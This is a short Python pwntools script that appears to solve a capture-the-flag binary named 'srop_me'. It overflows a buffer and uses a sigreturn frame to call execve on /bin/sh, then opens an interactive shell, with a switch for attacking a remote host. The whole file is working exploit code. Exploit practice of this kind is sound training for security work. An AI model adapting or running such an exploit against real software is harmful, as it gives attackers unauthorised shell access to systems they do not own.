#!/usr/bin/python3

from pwn import *

exe = ELF('srop_me', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*vuln+49

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

binsh = 0x40200f
syscall = 0x0000000000401019
sub = 0x000000000040101f

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x1
frame.rip = syscall
payload = 0x20 * b"a"  + p64(0x000000000040101f) + b"b" *0x20 + p64(syscall) + b"b" *0 + flat(bytes(frame))
sa(b"!!\n", payload)
sleep(5)
payload = b"c" *0xf
s(payload)
p.interactive()
